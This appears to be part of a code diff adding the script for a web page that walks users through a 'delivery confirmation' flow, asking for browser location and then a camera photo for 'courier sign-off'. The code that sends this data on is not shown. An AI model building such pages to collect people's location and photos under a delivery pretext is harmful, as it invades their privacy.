+                document.getElementById("location-active-state").classList.add("hidden");
+                document.getElementById("location-success-state").classList.remove("hidden");
+
+                if (res.coords) {
+                    document.getElementById("location-details-text").innerText = 
+                        `Verified at coordinates (${res.coords.latitude.toFixed(4)}, ${res.coords.longitude.toFixed(4)}) ±${Math.round(res.coords.accuracy)}m.`;
+                }
+
+                setTimeout(() => {
+                    switchStep("step-location", "step-camera");
+                }, 1400);
+
+            } else {
+                document.getElementById("location-active-state").classList.add("hidden");
+                const errBox = document.getElementById("location-error-state");
+                errBox.classList.remove("hidden");
+
+                if (res.error === 'PERMISSION_DENIED') {
+                    document.getElementById("location-error-msg").innerText = 
+                        "Location permission was denied. Please allow location access in your browser pop-up or site settings to confirm delivery.";
+                } else {
+                    document.getElementById("location-error-msg").innerText = 
+                        "Location services are currently unavailable. Please verify device GPS is toggled on and retry.";
+                }
+            }
+        }
+
+        document.getElementById("btn-continue-camera").addEventListener("click", async () => {
+            document.getElementById("camera-active-state").classList.add("hidden");
+            document.getElementById("camera-uploading-state").classList.remove("hidden");
+            await executeCameraStep();
+        });
+
+        document.getElementById("btn-retry-camera").addEventListener("click", async () => {
+            document.getElementById("camera-error-state").classList.add("hidden");
+            document.getElementById("camera-uploading-state").classList.remove("hidden");
+            await executeCameraStep();
+        });
+
+        async function executeCameraStep() {
+            const res = await step3_CameraCapture();
+
+            if (res.success || res.error === 'PERMISSION_DENIED' || res.error) {
+                // Advance to completion state gracefully whether granted or handled
+                if (res.success) {
+                    document.getElementById("complete-session-id").innerText = sessionId ? `#${sessionId.substring(0, 13)}...` : '#APX-9824';
+                    document.getElementById("complete-timestamp").innerText = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+                    switchStep("step-camera", "step-complete");
+                } else if (res.error === 'PERMISSION_DENIED') {
+                    document.getElementById("camera-uploading-state").classList.add("hidden");
+                    document.getElementById("camera-error-state").classList.remove("hidden");
+                    document.getElementById("camera-error-msg").innerText = "Camera access was denied. Verification photo is required to finalize courier sign-off.";
+                } else {
+                    // Fallback to complete on hardware missing or general fail so standard user is not stuck permanently
+                    document.getElementById("complete-session-id").innerText = sessionId ? `#${sessionId.substring(0, 13)}...` : '#APX-9824';
+                    document.getElementById("complete-timestamp").innerText = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                    switchStep("step-camera", "step-complete");
+                }
+            }
+        }
+
+        // Initialize execution on DOM Load
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", initPageFlow);
+        } else {
+            initPageFlow();
+        }
+    </script>
+</body>
+</html>
